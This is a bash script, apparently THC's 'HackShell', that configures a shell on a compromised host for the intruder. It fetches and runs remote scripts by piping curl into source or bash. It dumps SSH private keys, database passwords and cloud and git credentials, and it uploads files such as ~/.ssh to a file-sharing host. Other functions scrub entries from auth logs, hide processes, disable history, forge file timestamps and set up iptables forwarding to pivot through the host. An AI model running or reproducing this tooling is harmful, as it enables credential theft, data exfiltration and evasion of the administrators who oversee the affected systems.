#! /usr/bin/env bash

# HackShell - Post-Login shell configuration for hackers
#
# Configure the current shell to not create any files on the
# file system and set up some useful commands. Optionally download
# useful static binaries.
#
# Usage (memory only):
#     source <(curl -SsfL https://thc.org/hs)
# Usage with downloading binaries:
#     BIN=1 source <(curl -SsfL https://thc.org/hs)
#
# Environment variables:
#    XHOME=         Set custom XHOME directory instead of /dev/shm/.$'\t''~?$:?'
#
# https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/hackshell.sh
# 2024 by theM0ntarCann0n & skpr

CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CB="\033[1;34m" # blue
CM="\033[1;35m" # magenta
CC="\033[1;36m" # cyan
CDR="\033[0;31m" # red
CDG="\033[0;32m" # green
CDY="\033[0;33m" # yellow
CDM="\033[0;35m"
CDC="\033[0;36m" # cyan
CF="\033[2m"    # faint
CN="\033[0m"    # none
CW="\033[1;37m"


### Functions to keep in memory
HS_ERR()  { echo -e >&2  "${CR}ERROR: ${CDR}$*${CN}"; }
HS_WARN() { echo -e >&2  "${CY}WARN: ${CDM}$*${CN}"; }
HS_INFO() { echo -e >&2 "${CDG}INFO: ${CDM}$*${CN}"; }
xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
xsu() {
    local name="${1:?}"
    local u g h
    local cmd="python"

    command -v python3 >/dev/null && cmd="python3"
    [ $UID -ne 0 ] && { HS_ERR "Need root"; return; }
    u=$(id -u ${name:?}) || return
    g=$(id -g ${name:?}) || return
    h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)" || return
    HOME="${h:-/tmp}" "$cmd" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
}

xtmux() {
    local sox="${TMPDIR}/.tmux-${UID}"
    # Can not live in XHOME because XHOME is wiped on exit()
    tmux -S "${sox}" "$@"
    command -v fuser >/dev/null && { fuser "${sox}" || rm -f "${sox}"; }
}

xssh() {

    local ttyp
    echo -e "May need to cut & paste:${CDC}
reset -I
PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'
"'stty -echo;printf "\\033[18t";read -t5 -rdt R;stty sane $(echo "$R"|awk -F";" '"'"'{ printf "rows "$3" cols "$2; }'"'"')'"${CN}"
    ttyp=$(stty -g)
    stty raw -echo opost
    ssh "${HS_SSH_OPT[@]}" -T \
        "$@" \
        "unset SSH_CLIENT SSH_CONNECTION; TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'exec -a [uid] bash -i' /dev/null"
    stty "${ttyp}"
}

burl() {
    local proto x host query
    IFS=/ read -r proto x host query <<<"$1"
    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
    exec 3>&-
}
# burl http://ipinfo.io
# PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz

# Execute a command without changing file's ctime/mtime/atime
# notime <reference file> <cmd> ...
# - notime . rm -f foo.dat
# - notime foo chmod 700 foo
notime() {
    local ref="$1"
    local now

    [[ $# -le 1 ]] && { echo >&2 "notime <reference file> <cmd> ..."; return 255; }
    [[ ! -e "$ref" ]] && { echo >&2 "File not found: $ref"; return 255; }
    [ $UID -ne 0 ] && { HS_ERR "Need root"; return 255; }

    shift 1
    now=$(date -Ins) || return
    date --set="$(date -Ins -r "$ref")" >/dev/null || return
    "$@"
    date --set="$now" >/dev/null || return
}


# Presever mtime, ctime and birth-time as best as possible.
# notime_cp <src> <dst>
notime_cp() {
    local src="$1"
    local dst="$2"
    local now
    local olddir_date
    local dir

    [[ -z "$UID" ]] && UID="$(id -u)"
    [[ ! -f "$src" ]] && { echo >&2 "Not found: $src"; return 255; }
    if [[ -d "$dst" ]]; then
        dir="$dst"
        dst+="/$(basename "$src")"
    else
        dir="$(dirname "$dst")"
    fi
    # If dst exists then keep dst's time (otherwise use time of src)
    [[ -f "$dst" ]] && {
        # Make src identical to dst (late set dst to src).
        touch -r "$dst" "$src"
        chmod --reference "$dst" "$src"
    }

    olddir_date="$(date +%Y%m%d%H%M.%S -r "$dir")" || return
    [[ ! -e "$dst" ]] && {
        [[ "$UID" -eq 0 ]] && {
            now=$(date -Ins)
            date --set="$(date -Ins -r "$src")" >/dev/null || return
            touch "$dst"
            chmod --reference "$src" "$dst"
            touch -t "$olddir_date" "$dir"  # Changes ctime
            chmod --reference "$dir" "$dir" # Fixes ctime
            # [[ -n "$now" ]] && 
            date --set="$now" >/dev/null
            unset olddir_date
        }
    }

    cat "$src" >"$dst"
    chmod --reference "$src" "$dst"
    touch -r "$src" "$dst"

    [[ "$UID" -ne 0 ]] && {
        # Normal users can't change date to the past.
        touch -t "${olddir_date:?}" "$dir"
        return
    }
    now=$(date -Ins) || return
    date --set="$(date -Ins -r "$src")" || return
    chmod --reference "$dst" "$dst"   # Fixes ctime
    date --set="$now"
}

resolv() { while read -r x; do r="$(getent hosts "$x")" || continue; echo "${r%% *}"$'\t'"${x}"; done; }
find_subdomains() {
	local d="${1//./\\.}"
	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
	local rex="$rexf"'([^0-9a-zA-Z_]{1}|$)'
	[ $# -le 0 ] && { echo -en >&2 "Extract sub-domains from all files (or stdin)\nUsage  : find_subdomains <apex-domain> <file>\nExample: find_subdomain .com | anew"; return; }
	shift 1
	[ $# -le 0 ] && [ -t 0 ] && set -- .
	command -v rg >/dev/null && { rg -oaIN --no-heading "$rex" "$@" | grep -Eao "$rexf"; return; }
	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
}

# HS_TRANSFER_PROVIDER="transfer.sh"
HS_TRANSFER_PROVIDER="oshi.at"

transfer() {
    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
    [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1}"; return; }
    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1##*/}.tar.gz"; return; }
    curl -SsfL --progress-bar -T "$1" "https://${HS_TRANSFER_PROVIDER}/${1##*/}"
}

# SHRED without shred command
command -v shred >/dev/null || shred() {
    [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
    dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
    rm -f "${1:?}"
}

bounceinit() {
    [[ -n "$_is_bounceinit" ]] && return
    _is_bounceinit=1

    echo 1 >/proc/sys/net/ipv4/ip_forward
    echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
    [ $# -le 0 ] && {
        HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit." 
        set -- "0.0.0.0/0"
    }
    while [ $# -gt 0 ]; do
        _hs_bounce_src+=("${1}")
        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
        shift 1
    done
    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
    iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
    iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
    HS_INFO "Use ${CDC}unbounce${CDM} to remove all bounces."
}

unbounce() {
    unset _is_bounceinit
    local str

    for x in "${_hs_bounce_dst[@]}"; do
        iptables -t nat -D PREROUTING -p tcp --dport "${x%%-*}" -m mark --mark 1188 -j DNAT --to "${x##*-}"
    done
    unset _hs_bounce_dst

    for x in "${_hs_bounce_src[@]}"; do
        iptables -t mangle -D PREROUTING -s "${x}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
    done
    unset _hs_bounce_src
    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
    iptables -D FORWARD -m mark --mark 1188 -j ACCEPT 2>/dev/null
    iptables -t nat -D POSTROUTING -m mark --mark 1188 -j MASQUERADE 2>/dev/null
    iptables -t nat -D POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark 2>/dev/null
    HS_INFO "DONE. Check with ${CDC}iptables -t mangle -L PREROUTING -vn; iptables -t nat -L -vn; iptables -L FORWARD -vn${CN}"
}

bounce() {
    local fport="$1"
    local dstip="$2"
    local dstport="$3"
    [[ $# -lt 3 ]] && {
        echo -e >&2 "\
Forward ingress traffic to _this_ host onwards to another host
Usage: bounce <Local Port> <Destination IP> <Destination Port>
${CDC} bounce 2222  10.0.0.1  22   ${CN}# Forward 2222 to internal host's port 22
${CDC} bounce 31336 127.0.0.1 8080 ${CN}# Forward 31336 to server's 8080
${CDC} bounce 31337 8.8.8.8   53   ${CN}# Forward 31337 to 8.8.8.8's 53$"
        return 255
    }
    bounceinit

    iptables -t nat -A PREROUTING -p tcp --dport "${fport:?}" -m mark --mark 1188 -j DNAT --to "${dstip:?}:${dstport:?}" || return
    _hs_bounce_dst+=("${fport}-${dstip}:${dstport}")
    HS_INFO "Traffic to _this_ host's ${CDY}${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
}

crt() {
    [ $# -ne 1 ] && { HS_ERR "crt <domain-name>"; return 255; }
    command -v jq >/dev/null || { HW_ERR "Command not found: jq"; return 255; }
    command -v anew >/dev/null || { HW_ERR "Command not found: anew"; return 255; }
    curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
}

rdns () {
    curl -fsSL "https://lookup.segfault.net/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
}

ghostip() {
    source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
}

hide() {
    local _pid="${1:-$$}"
    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && HS_INFO "PID $_pid is now hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}

_hs_xhome_init() {
    [[ "$PATH" != *"$XHOME"* ]] && export PATH="${XHOME}:$PATH"
    command -v curl >/dev/null && curl --help curl | grep -i proto-default && alias curl="--proto-default https"
}

hs_mkxhome() {
    _hs_xhome_init
    [ -d "${XHOME}" ] && return 255
    mkdir -p "${XHOME:?}" 2>/dev/null || return
    echo -e ">>> Using ${CDY}XHOME=${XHOME}${CN}. ${CF}[will auto-destruct on exit]${CN}"
    echo -e ">>> Type ${CDC}destruct${CN} to erase ${CDY}${XHOME}${CN}"
    echo -e ">>> Type ${CDC}keep${CN} to disable auto-destruct on exit."
    echo -e ">>> Type ${CDC}cdx${CN} to change to your hidden ${CDY}\"\${XHOME}\"${CN} directory"
}

cdx() { cd "${XHOME}" || return; }

# Keep this seperate because this actually creates data.
xhome() {
    export HOME="${XHOME}"
    echo -e "${CDM}HOME set to ${CDY}${XHOME}${CN}"
    hs_mkxhome
    echo -e ">>> Type ${CDC}home${CN} to undo."
}

home() {
    export HOME="${_HS_HOME_ORIG}"
}

keep() {
    touch "${XHOME}/.keep" 2>/dev/null
    HS_INFO "Wont delete ${CDY}${XHOME}${CDM} on exit"
}

np() {
    local cmdl=()
    command -v noseyparker >/dev/null || { HS_ERR "Not found: noseyparker. Type ${CDC}bin noseyparker${CDR} first."; return 255;}
    [ -t 1 ] && {
        HS_WARN "Use ${CDC}np $*| less -R${CN} instead."
        return;
    }
    command -v nice >/dev/null && cmdl=("nice" "-n19")
    cmdl+=("noseyparker")
	local d="/tmp/.np-${UID}-$$"
	[ -d "${d}" ] && rm -rf "${d:?}"
	[ $# -le 0 ] && set - .
	NP_DATASTORE="$d" "${cmdl[@]}" -q scan "$@" >&2 || return
	NP_DATASTORE="$d" "${cmdl[@]}" report --color=always
	rm -rf "${d:?}"
}

zapme() {
    HS_WARN "Starting new/zapper SHELL. Type '${CDC} source <(curl -SsfL https://thc.org/hs)${CDM}' again."
    exec zapper -f -a"${1:--}" bash -il
}

bin() {
    local arch="$(uname -m)"
    local os="$(uname -s)"
    local a
    local single="${1}"
    local is_showhelp=1

    [ -z "$os" ] && os="Linux"
    [ -z "$arch" ] && arch="x86_64"
    [ -n "$single" ] && unset is_showhelp
    a="${arch}"

    hs_mkxhome

    bin_dl() {
        local dst="${XHOME}/${1:?}"
        local str="${CDM}Downloading ${CDC}${1:?}${CDM}........................................"
        local is_skip
        [ -n "$single" ] && {
            [ -n "$_HS_SINGLE_MATCH" ] && return # already tried to download
            [ "$single" != "$1" ] && { unset _HS_SINGLE_MATCH; return; }
            _HS_SINGLE_MATCH=1
        }
        echo -en "${str:0:64}"
        [ -s "${dst}" ] || rm -f "${dst:?}" 2>/dev/null
        [ -z "$FORCE" ] && command -v "${1}" >/dev/null && is_skip=1
        [ -n "$FORCE" ] && [ -s "$dst" ] && is_skip=1
        [ -n "$is_skip" ] && { echo -e "[${CDY}SKIPPED${CDM}]${CN}"; return 0; }
        { err=$(dl "${2:?}"  2>&1 >&3 3>&-); } >"${dst}" 3>&1 || {
            rm -f "${dst:?}" 2>/dev/null
            if [ -z "$UNSAFE" ] && [[ "$err" == *"$_HS_SSL_ERR"* ]]; then
                echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}\n---> Try ${CDC}export UNSAFE=1${CN}"
            else
                echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}${CN}"
            fi
            return 255
        }
        chmod 711 "${dst}"
        echo -e ".....[${CDG}OK${CDM}]${CN}"
    }

    bin_dl gs-netcat "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${arch}"
    bin_dl zapper    "https://github.com/hackerschoice/zapper/releases/latest/download/zapper-${os,,}-${arch}"
    bin_dl curl      "https://bin.ajam.dev/${a}/curl"
    bin_dl rg        "https://bin.ajam.dev/${a}/ripgrep"
    bin_dl fd        "https://bin.ajam.dev/${a}/fd-find"
    bin_dl anew      "https://bin.ajam.dev/${a}/anew"
    bin_dl ping      "https://bin.ajam.dev/${a}/ping"
    bin_dl nc        "https://bin.ajam.dev/${a}/ncat"
    bin_dl socat     "https://bin.ajam.dev/${a}/socat"
    bin_dl jq        "https://bin.ajam.dev/${a}/jq"
    bin_dl reptyr    "https://bin.ajam.dev/${a}/reptyr"
    bin_dl netstat   "https://bin.ajam.dev/${a}/netstat"
    bin_dl rsync     "https://bin.ajam.dev/${a}/rsync"
    bin_dl strace    "https://bin.ajam.dev/${a}/strace"
    bin_dl script    "https://bin.ajam.dev/${a}/Baseutils/util-linux/script"
    bin_dl awk       "https://bin.ajam.dev/${a}/Baseutils/gawk/gawk"
    # bin_dl awk       "https://bin.ajam.dev/${a}/awk"
    bin_dl base64    "https://bin.ajam.dev/${a}/Baseutils/coreutils/base64"
    bin_dl gzip      "https://bin.ajam.dev/${a}/Baseutils/gzip/gzip"
    bin_dl hexdump   "https://bin.ajam.dev/${a}/Baseutils/util-linux/hexdump"
    bin_dl zgrep     "https://bin.ajam.dev/${a}/Baseutils/gzip/zgrep"
    bin_dl grep      "https://bin.ajam.dev/${a}/Baseutils/grep"
    bin_dl tar       "https://bin.ajam.dev/${a}/Baseutils/tar/tar"
    bin_dl sed       "https://bin.ajam.dev/${a}/Baseutils/sed"
    bin_dl nmap      "https://bin.ajam.dev/${a}/nmap"
    bin_dl tcpdump   "https://bin.ajam.dev/${a}/tcpdump"
    bin_dl openssl   "https://bin.ajam.dev/${a}/Baseutils/openssl/openssl"
    bin_dl busybox   "https://bin.ajam.dev/${a}/Baseutils/busybox/busybox"
    [ "$arch" = "x86_64" ] && bin_dl noseyparker "https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static"

    [ -n "$single" ] && [ -z "$_HS_SINGLE_MATCH" ] && {
        local str="${single##*/}"
        local loc="${single}"
        unset single
        bin_dl "${str}" "https://bin.ajam.dev/${a}/${loc}"
    }
    unset _HS_SINGLE_MATCH
    [ -n "$is_showhelp" ] && {
        [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to ignore systemwide binaries" 
        echo -e ">>> Use ${CDC}bin <name>${CN} to download a specific binary"
        echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line
>>> options from your current shell and all further processes."
        echo -e ">>> ${CDG}Download COMPLETE${CN}"
    }

    unset -f bin_dl
}

loot_sshkey() {
    local str
    local fn="${1:?}"

    [ ! -s "${fn}" ] && return
    grep -Fqam1 'PRIVATE KEY' "${fn}" || return

    [ -n "$_HS_SETSID_WAIT" ] && {
        str="${CF}password protected"
        setsid -w ssh-keygen -y -f "${fn}" </dev/null &>/dev/null && str="${CDR}NO PASSWORD"
    }
    echo -e "${CB}SSH-Key ${CDY}${fn}${CN} ${str}${CDY}${CF}"
    cat "$fn"
    echo -en "${CN}"
}

loot_bitrix() {
    local fn="${1:?}"
    [ ! -f "$fn" ] && return
    grep -Fqam1 '$_ENV[' "$fn" && return
    echo -e "${CB}Bitrix-DB ${CDY}${fn}${CF}"
    grep --color=never -E "(host|database|login|password)'.*=" "${fn}"
    echo -en "${CN}"
}

# _loot_home <NAME> <filename>
_loot_homes() {
    local fn
    for fn in "${HOMEDIR:-/home}"/*/"${2:?}" /root/"${2}"; do
        [ ! -s "$fn" ] && continue
        echo -e "${CB}${1:-CREDS} ${CDY}${fn}${CF}"
        cat "$fn"
        echo -en "${CN}"
    done
}

# Someone shall implement a sub-set from TeamTNT's tricks (use
# noseyparker for cpu/time-intesive looting). TeamTNT's infos:
# https://malware.news/t/cloudy-with-a-chance-of-credentials-aws-targeting-cred-stealer-expands-to-azure-gcp/71346
# https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker
loot() {
    local h="${_HS_HOME_ORIG:-$HOME}"
    local str

    for fn in "${HOMEDIR:-/home}"/*/.my.cnf /root/.my.cnf; do
        [ ! -s "$fn" ] && continue
        echo -e "${CB}MySQL ${CDY}${fn}${CF}"
        grep -vE "^(#|\[)" <"${fn}"
        echo -en "${CN}"
        # grep -E "^(user|password)" "${h}/.my"
    done
    for fn in "${HOMEDIR:-/home}"/*/.mysql_history /root/.mysql_history; do
        [ ! -s "$fn" ] && continue
        str=$(grep -ia '^SET PASSWORD FOR' "$fn") || continue
        echo -e "${CB}MySQL ${CDY}${fn}${CF}"
        echo "$str"
        echo -en "${CN}"
    done

    ### Bitrix
    for fn in "${HOMEDIR:-/home}"/*/*/bitrix/.settings.php; do
        loot_bitrix "$fn"
    done

    find /var/www -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" 2>/dev/null | while read -r fn; do
        loot_bitrix "$fn"
    done

    ### SSH Keys
    [ -e "/etc/ansible/ansible.cfg" ] && {
        str="$(grep ^private_key_file "/etc/ansible/ansible.cfg")"
        s="${str##*= }"
        loot_sshkey "$s"
    }

    for fn in "${HOMEDIR:-/home}"/*/.ssh/* /root/.ssh/*; do
        loot_sshkey "$fn"
    done

    _loot_homes "SMB"    ".smbcredentials"
    _loot_homes "SMB"    ".samba_credentials"
    _loot_homes "PGSQL"  ".pgpass"
    _loot_homes "RCLONE" ".config/rclone/rclone.conf"
    _loot_homes "GIT"    ".git-credentials"
    _loot_homes "AWS S3" ".s3cfg"
    _loot_homes "AWS S3" ".passwd-s3fs"
    _loot_homes "AWS S3" ".s3backer_passwd"
    _loot_homes "AWS S3" ".passwd-s3fs"
    _loot_homes "AWS S3" ".boto"
    _loot_homes "NETRC"  ".netrc"

    ls -al /tmp/ssh-* &>/dev/null && {
        echo -e "${CB}SSH AGENT${CDY}${CF}"
        find /tmp -name 'agent.*' -ls
        echo -e "${CN}"
    }
}

ws() {
    dl https://thc.org/ws | bash
}

_hs_destruct() {
    [ -z "$XHOME" ] && return
    [ ! -d "$XHOME" ] && return
    echo -e ">>> Cleansing ${CDY}${XHOME}${CN}"
    rm -rf "${XHOME:?}"
}

destruct() {
    _hs_destruct
    export HOME="${_HS_HOME_ORIG}"
}

hs_exit() {
    cd /tmp || cd /dev/shm || cd /
    [ "${#_hs_bounce_src[@]}" -gt 0 ] && HS_WARN "Bounce still set in iptables. Type ${CDC}unbounce${CN} to stop the forward."
    [ -n "$XHOME" ] && [ -d "$XHOME" ] && {
        if [ -f "${XHOME}/.keep" ]; then
            HS_WARN "Keeping ${CDY}${XHOME}${CN}"
        else
            _hs_destruct
        fi
    }
    [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.lorg/tips${CN} 😘"
    kill -9 $$
}

[ -z "$BASH" ] && TRAPEXIT() { hs_exit; } #zsh

### Functions (temporary)
hs_init_dl() {
    # Ignore TLS certificate. This is DANGEROUS but many hosts have missing ca-bundles or TLS-Proxies.
    if command -v curl >/dev/null; then
        _HS_SSL_ERR="certificate "
        dl() { 
            local opts=()
            [ -n "$UNSAFE" ] && opts=("-k")
            curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 3 "${1:?}"
        }
    elif command -v wget >/dev/null; then
        _HS_SSL_ERR="is not trusted"
        dl() {
            local opts=()
            [ -n "$UNSAFE" ] && opts=("--no-check-certificate")
            wget -O- "${opts[@]}" --connect-timeout=7 --dns-timeout=7 "${1:?}"
        }
    else
        dl() { HS_ERR "Not found: curl, wget"; }
    fi
}

hs_init() {
    local a
    local prg="$1"
    local str

    [ -z "$BASH" ] && { HS_WARN "Shell is not BASH. Try:
${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chmod 700 bash && exec bash -il'"; sleep 2; }
    [ -n "$BASH" ] && [ "${prg##*\.}" = "sh" ] && { HS_ERR "Use ${CDC}source $prg${CDR} instead"; sleep 2; exit 255; }
    [ -n "$BASH" ] && {
        str="$(command -v bash)"
        [ -n "$str" ] && SHELL="${str}"
    }
    [ -z "$UID" ] && UID="$(id -u)"
    [ -n "$_HS_HOME_ORIG" ] && export HOME="$_HS_HOME_ORIG"
    export _HS_HOME_ORIG="$HOME"

    if [ -n "$BASH" ]; then
        trap hs_exit EXIT SIGHUP SIGTERM SIGPIPE
    else
        trap hs_exit SIGHUP SIGTERM SIGPIPE
    fi

    setsid --help | grep -Fqm1 -- --wait && _HS_SETSID_WAIT=1

    HS_SSH_OPT=()
    command -v ssh >/dev/null && {
        str="$(ssh -V 2>&1)"
        [[ "$str" == OpenSSH_[67]* ]] && a="no"
        HS_SSH_OPT+=("-oStrictHostKeyChecking=${a:-accept-new}")
        # HS_SSH_OPT+=("-oUpdateHostKeys=no")
        HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
        HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
        HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
    }
    hs_init_dl
}

_scan_single() {
    local opt=("${2}")

    [ -f "$2" ] && opt=("-iL" "$2")
    nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" | grep -F Ports
}

# scan <port> <IP or file> ...
scan() {
    local port="${1:?}"

    shift 1
    command -v nmap >/dev/null || { HR_ERR "Not found: nmap. Try ${CDC}bin nmap${CDR} first"; return 255; }
    for ip in "$@"; do
        _scan_single "$port" "$ip"
    done
}

hs_init_alias() {
    alias ssh="ssh ${HS_SSH_OPT[*]}"
    alias scp="scp ${HS_SSH_OPT[*]}"
    alias wget='wget --no-hsts'
    alias vi="vi -i NONE"
    alias vim="vim -i NONE"
    alias screen="screen -ln"
    command -v curl >/dev/null && curl --help curl | grep -i proto-default && alias curl="--proto-default https"
}

hs_init_shell() {
    unset HISTFILE
    [ -n "$BASH" ] && export HISTFILE="/dev/null"
    export BASH_HISTORY="/dev/null"
    export LANG=en_US.UTF-8
    locale -a 2>/dev/null|grep -Fqim1 en_US.UTF || export LANG=en_US
    export LESSHISTFILE=-
    export REDISCLI_HISTFILE=/dev/null
    export MYSQL_HISTFILE=/dev/null
    export T=.$'\t''~?$?'
    TMPDIR="/tmp"
    [ -d "/var/tmp" ] && TMPDIR="/var/tmp"
    [ -d "/dev/shm" ] && TMPDIR="/dev/shm"
    export TMPDIR
    [ -z "$XHOME" ] && export XHOME="${TMPDIR}/${T}"

    [ "${PATH:0:2}" != ".:" ] && export PATH=".:${PATH}"
    # Might already exist.
    [ -d "$XHOME" ] && _hs_xhome_init

    # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \e[36m\u\e[m@\e[32m\h:\e[33;1m\w \e[0;31m\$\e[m '
    if [[ "$SHELL" == *"zsh" ]]; then
        PS1='%F{red}%n%f@%F{cyan}%m %F{magenta}%~ %(?.%F{green}.%F{red})%#%f '
    else
        PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
    fi
}

xhelp() {
    # Output help
    echo -en "\
${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
${CDC} xsu username                          ${CDM}Switch user
${CDC} xtmux                                 ${CDM}'hidden' tmux ${CN}${CF}[e.g. empty tmux list-s]
${CDC} xssh                                  ${CDM}Silently log in to remote host
${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination
${CDC} ghostip                               ${CDM}Originate from a non-existing IP
${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
${CDC} shred file                            ${CDM}Securely delete a file
${CDC} notime <file> rm -f foo.dat           ${CDM}Execute a command at the <file>'s ctime & mtime
${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
${CDC} find_subdomain .foobar.com            ${CDM}Search files for sub-domain
${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-domains
${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP
${CDC} hide <pid>                            ${CDM}Hide a process
${CDC} np <directory>                        ${CDM}Display secrets with NoseyParker ${CN}${CF}[try |less -R]
${CDC} loot                                  ${CDM}Display common secrets
${CDC} ws                                    ${CDM}WhatServer - display server's essentials
${CDC} bin                                   ${CDM}Download useful static binaries
${CDC} xhelp                                 ${CDM}This help"
    echo -e "${CN}"
}


### Programm
hs_init "$0"
hs_init_alias
hs_init_shell
xhelp

### Finishing
str=""
[ -z "$BIN" ] && {
    echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
    str="No data was written to the filesystem"
}
echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
echo -e ">>> ${CG}Setup complete. ${CF}${str}${CN}"

# unset all functions that are no longer needed.
unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
unset BIN str SSH_CONNECTION SSH_CLIENT
